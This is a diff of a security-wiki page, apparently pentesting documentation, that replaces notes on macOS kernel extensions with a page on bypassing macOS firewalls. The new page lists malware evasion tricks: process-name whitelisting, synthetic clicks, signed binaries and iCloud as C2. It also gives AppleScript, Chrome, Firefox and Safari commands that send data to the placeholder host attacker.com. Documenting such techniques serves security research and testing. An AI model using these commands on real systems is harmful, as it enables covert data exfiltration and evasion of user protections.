@@ -1,4 +1,4 @@
-# macOS Kernel Extensions
+# macOS Bypassing Firewalls
 
 <details>
 
@@ -12,40 +12,88 @@
 
 </details>
 
-## Basic Information
+## Found techniques
 
-Kernel extensions (Kexts) are **bundles** using **`.kext` extension** that are **loaded directly into the kernel space** of macOS, providing additional functionality to the core operating system.
+The following techniques were found working in some macOS firewall apps.
 
-### Requirements
+### Abusing whitelist names
 
-Obviously, this is so powerful, it's complicated to load a kernel extension. These are the requirements of a kernel extension to be loaded:
+* For example calling the malware with names of well known macOS processes like **`launchd`**&#x20;
 
-* Going into **recovery mode** Kexts need to be **allowed to be loaded**:
+### Synthetic Click
 
-<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+* If the firewall ask for permission to the user make the malware **click on allow**
 
-* The Kext must be **signed with a kernel code signing certificate**, which can only be granted by **Apple**. Who will be **reviewing** in detail the **company** and the **reasons** why this is needed.
-* The Kext also needs to be **notarized**, Apple will be able to check it for malware.
-* Then, the **root user** is the one that can load the Kext and the files inside the bundle must belong to root.
-* Finally, once trying to load it, the [**user will be prompted for confirmation**](https://developer.apple.com/library/archive/technotes/tn2459/\_index.html) and if accepted, the computer must **reboot** to load it.
+### **Use Apple signed binaries**
 
-### Loading Process
+* Like **`curl`**, but also others like **`whois`**
 
-Back in Catalina it was like this: It's interesting to note that the **verification** process occurs on **userland**. However, only applications with the entitlement **`com.apple.private.security.kext-management`** can **ask the kernel** to **load an extension:** kextcache, kextload, kextutil, kextd, syspolicyd
+### Well known apple domains
 
-1. **`kextutil`** cli **starts** the verification process to load an extension
-   * It'll talk to **`kextd`** sending using a Mach service
-2. **`kextd`** will check several things, such as the signature
-   * It'll talk to **`syspolicyd`** to check if the extension can be loaded
-3. **`syspolicyd`** **asks** the **user** if the extension hasn't be loaded previously
-   * **`syspolicyd`** will indicate the result to **`kextd`**
-4. **`kextd`** will finally be able to indicate the **kernel to load the extension**
+The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
 
-If kextd is not available, kextutil can perform the same checks.
+### Generic Bypass
+
+Some ideas to try to bypass firewalls
+
+### Check allowed traffic
+
+Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
+
+```bash
+lsof -i TCP -sTCP:ESTABLISHED
+```
+
+### Abusing DNS
+
+DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### Via Browser apps
+
+* **oascript**
+
+```applescript
+tell application "Safari"
+    run
+    tell application "Finder" to set visible of process "Safari" to false
+    make new document
+    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
+end tell
+```
+
+* Google Chrome
+
+{% code overflow="wrap" %}
+```bash
+"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
+```
+{% endcode %}
+
+* Firefox
+
+```bash
+firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
+```
+
+* Safari
+
+```bash
+open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
+```
+
+### Via processes injections
+
+If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+
+{% content-ref url="macos-proces-abuse/" %}
+[macos-proces-abuse](macos-proces-abuse/)
+{% endcontent-ref %}
 
 ## References
 
-* [https://www.makeuseof.com/how-to-enable-third-party-kernel-extensions-apple-silicon-mac/](https://www.makeuseof.com/how-to-enable-third-party-kernel-extensions-apple-silicon-mac/)
+* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
 <details>
 
